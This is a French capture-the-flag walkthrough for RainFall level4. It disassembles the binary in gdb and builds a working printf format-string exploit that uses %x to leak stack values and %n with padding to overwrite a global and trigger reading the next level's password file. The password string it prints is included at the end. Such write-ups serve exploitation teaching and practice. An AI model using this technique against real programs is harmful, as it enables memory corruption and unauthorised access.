    __               ____ __
   / /__ _   _____  / / // /
  / / _ \ | / / _ \/ / // /_
 / /  __/ |/ /  __/ /__  __/
/_/\___/|___/\___/_/  /_/   
                            
                            
On lance le binaire et on se rend compte qu'il duplique ce que l'on écrit sur l'entrée standard. 

level4@RainFall:~$ ./level4
AAAA
AAAA

Again …

>$ (gdb) objdump -d level4

On peut voir que le <main> fait appel à une fonction <n>. On parcours <n> celle ci utilise la fonction fgets().
L’utilisation de fgets() à la place de gets() complique la tâche de réalisation d’un buffer overflow : 

“The gets() function cannot be used securely.  Because of its lack of bounds checking, and the inability for the 
calling program to reliably determine the length of the next incoming line, the use of this function enables malicious 
users to arbitrarily change a running program's functionality through a buffer overflow attack.  It is strongly suggested 
that the fgets() function be used in all cases.”

char *fgets(char *restrict str, int size,FILE * restrict stream);

(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax           (1) restrict stream : 0x8049860=STDIN
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)         (2) size
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax        (3) restrict str (notre input)
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>    (4) appel fgets avec les arguments (1), (2) & (3)
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)              (5) push notre input en argument pour <p>
   0x08048488 <+49>:	call   0x8048444 <p>            (6) appel <p> 
              -------------------------------------------------------------------------------------------------
              CALL <p> [(gdb) disas p]
              0x08048444 <+0>:	push   %ebp
              0x08048445 <+1>:	mov    %esp,%ebp
              0x08048447 <+3>:	sub    $0x18,%esp
              0x0804844a <+6>:	mov    0x8(%ebp),%eax            (7) >$(gdb) x $ebp + 8 -> 0xbffff4e0 -> input 
              0x0804844d <+9>:	mov    %eax,(%esp)               (8) push notre input en argument pour printf
              0x08048450 <+12>:	call   0x8048340 <printf@plt>    (9) appel printf qui nous affiche notre input
              0x08048455 <+17>:	leave
              0x08048456 <+18>:	ret
              -------------------------------------------------------------------------------------------------
   0x0804848d <+54>:	mov    0x8049810,%eax            (10) eax qui devrait contenir le retour de printf (le														
                                                           nombres caractères affichés) est écrasé par 8049810 												
                                                           qui est une chaine vide
   0x08048492 <+59>:	cmp    $0x1025544,%eax           (11) eax est ensuite comparé à 0x1025544 ou 16930116 en décimale          
   0x08048497 <+64>:	jne    0x80484a5 <n+78>          (12) 
   0x08048499 <+66>:	movl   $0x8048590,(%esp)         (12a)si eax == 0x1025544 alors on appel <system@plt> avec pour
   0x080484a0 <+73>:	call   0x8048360 <system@plt>         argument 0x8048590 -> "/bin/cat /home/user/level5/.pass"
   0x080484a5 <+78>:	leave                            (12b)si eax != 0x1025544 alors on quitte la fonction
   0x080484a6 <+79>:	ret
End of assembler dump.

La question est donc : comment réécrire le contenu de 0x8049810 avec “0x1025544” ?

On peut remarquer la présence de printf() qui est une source importantes d'exploitations type format strings.

Afin de mener à bien cet exploit. Il nous faut :
 
1. Lire dans la memoire

Ajoutons à notre input un format specifiers “%x” :

level4@RainFall:~$ ./level4
AAAA%x
AAAA200

printf() n’ayant aucun n’argument auquel référer “%x”, printf() nous affiche donc ce qu’il trouve sur la stack. 

2. Localiser le buffer de printf() dans la memoire

Ajoutons progressivement des format specifier “%x” :

level4@RainFall:~$ python -c "print 'AAAA %x %x %x %x'" | ./level4
AAAA 200 b7fd1ac0 b7ff37d0 41414141

Encore ...

level4@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141

On retrouve notre buffer “41414141”. 

level4@RainFall:~$ python -c 'print "AAAA %12$x"' | ./level4
AAAA 41414141

On peut aussi préciser explicitement quel argument prendre, en écrivant, à chaque conversion, « %p$ » […] l’entier 
décimal p indique la position dans la liste d'arguments (ici notre stack).

3.  Injectez notre adresse 0x8049810 dans le buffer de printf()

level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 8049810

OU 

level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%12$x"' | ./level4
8049810

Success ! On retrouve bien 8049810 à la position “%12$x”

4. Ecrire dans 8049810

Nous allons utiliser le format specifier “%n“ qui saisis le nombre de caractères qui ont été écrits avec succès avant l’occurence 
de “%n” dans le flux ou la mémoire tampon. Cette valeur est stockée dans l'entier dont l'adresse est donnée en argument. Or l’argument 
ici est situé à une position que nous avons déterminée (2) et remplacée par l’adresse souhaitée “0x8049810” (3). 

Il nous faut donc (0x1025544) 16930116 caractères avant “%n” afin de passer la comparaison

0x080484df <+59>:	cmp    $0x1025544,%eax	

Si nous rajoutons un entier X entre le "%" et "d" du bien connu format specifier "%d" on obtiendra un padding d'X espace " ". 
%Xd étant un format specifier l'input est interpreté au niveau de printf().

%4d -> padding de 4 espaces
%16930116d -> padding de 16930116 espaces ... ;)

On peut alors monter l'exploit suivante :

level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
...
...
...
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a


Next …
